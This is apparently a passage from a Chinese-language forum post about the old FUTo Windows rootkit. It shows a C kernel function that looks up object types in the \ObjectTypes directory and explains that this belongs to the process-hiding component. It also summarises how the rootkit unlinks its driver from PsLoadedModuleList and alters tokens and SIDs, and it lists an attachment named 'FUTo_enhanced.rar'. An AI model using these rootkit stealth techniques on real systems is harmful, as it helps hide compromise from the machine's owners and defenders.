
```c
POBJECT\_TYPE 
FindObjectTypes (char *ac\_tName)
{
OBJECT\_ATTRIBUTES ObjectAttributes;
UNICODE\_STRING ucName, ufName;
ANSI\_STRING afName;
NTSTATUS ntStatus;
HANDLE hDirectory = NULL;
POBJECT\_DIRECTORY pDirectoryObject = NULL;
POBJECT\_DIRECTORY\_ENTRY DirectoryEntry;
POBJECT\_HEADER objHead;
ULONG Bucket = 0;
DWORD d\_size;
PUNICODE\_STRING p\_wcName;

p\_wcName = (PUNICODE\_STRING) ExAllocatePool(PagedPool, \\
    sizeof(UNICODE\_STRING)+(sizeof(WCHAR)\*1024));
if (p\_wcName == NULL)
    return NULL;

p\_wcName->Length = 0;
p\_wcName->MaximumLength = 1022;
p\_wcName->Buffer = (PWSTR)((DWORD)p\_wcName + sizeof(UNICODE\_STRING));

RtlInitAnsiString(&afName, ac\_tName);
       
// open driver directory in the object directory
RtlInitUnicodeString(&ucName,L"\\ObjectTypes");
InitializeObjectAttributes(&ObjectAttributes,&ucName,OBJ\_CASE\_INSENSITIVE,NULL,NULL);
ntStatus = ObOpenObjectByName(&ObjectAttributes,
                              NULL,
                              KernelMode,
                              NULL,
                              0x80000000,
                              NULL,
                              &hDirectory);
if (!NT\_SUCCESS (ntStatus))
    return NULL;

// get pointer from handle
ntStatus = ObReferenceObjectByHandle(hDirectory,
                                     FILE\_ANY\_ACCESS,
                                     NULL,
                                     KernelMode,
                                     &pDirectoryObject,
                                     NULL);
ZwClose (hDirectory);
if (!NT\_SUCCESS (ntStatus))
    return NULL;

ntStatus = RtlAnsiStringToUnicodeString(&ufName, &afName, TRUE);
if (!NT\_SUCCESS (ntStatus))
    return NULL;
    
// walk the object directory
for (Bucket = 0; Bucket < NUMBER\_HASH\_BUCKETS; Bucket++) 
{
    DirectoryEntry = pDirectoryObject->HashBuckets\[Bucket\];
    while (DirectoryEntry != NULL)
    {
        ntStatus = ObQueryNameString(DirectoryEntry->Object, 
                                      (POBJECT\_NAME\_INFORMATION) p\_wcName, 
                                      p\_wcName->MaximumLength, 
                                      &d\_size);
        if (NT\_SUCCESS (ntStatus))
        {
            if (RtlCompareUnicodeString(p\_wcName, &ufName, TRUE)==0)
            {
                if (pDirectoryObject)
                    ObDereferenceObject(pDirectoryObject);
                RtlFreeUnicodeString(&ufName);
                ExFreePool(p\_wcName);
                return (POBJECT\_TYPE) DirectoryEntry->Object;
            }
        }
        p\_wcName->MaximumLength = 1022;
        DirectoryEntry = DirectoryEntry->ChainLink;
    }
}

if (pDirectoryObject)
    ObDereferenceObject(pDirectoryObject);
RtlFreeUnicodeString(&ufName);
ExFreePool(p\_wcName);
return NULL;
}
```

这只是 `FUTO` 中隐藏进程的部分，做的还是比较系统的。现在看来科普很重要啊。虽然这些东西很简单，但要一个人去 `coding`，还不是件容易事。有源码就要下功夫去汲取营养，有所收获！`img/f43c1e514327696dccbb0da997496b2a.jpg`

里面还有个是抹掉`PsLoadedModuleList`链中关于`Driver`的信息。其他的就是什么设置`SID`、`ProcessToken`之类的，有点儿烦琐。

然后 `R3` 部分负责发 `IRP` 到 `R0` 中，就是传递个进程 `ID`，思路还是挺简单的。呵呵，写了点儿很烂的东西，希望对没有学过这个古老的 `rootkit` 的同学有点儿帮助！`img/9d43c9aee695f95b024aafd1b69ffa5a.jpg`

-------------------------------------------------------------------------

### 参考资料

1.  [JIURL 玩玩 Win2k 对象](http://blog.csdn.net/iiprogram/archive/2006/04/07/654884.aspx)
2.  [Windows 2000 的对象管理](http://dev.csdn.net/Develop/article/28/70543.shtm)
3.  [Windows 对象 (Object) 的组织](http://www.phpfav.com/?p=83)
4.  `WRK1.2` `Windbg`

### 上传的附件

| `img/c8c74a380a3dea7fa2460187d80ee5e0.jpg` | `FUTo\_enhanced.rar` |
| :--- | :--- |

| `img/c8c74a380a3dea7fa2460187d80ee5e0.jpg` | `Inside WINDOWS NT Object Manager.rar` |
| :--- | :--- |
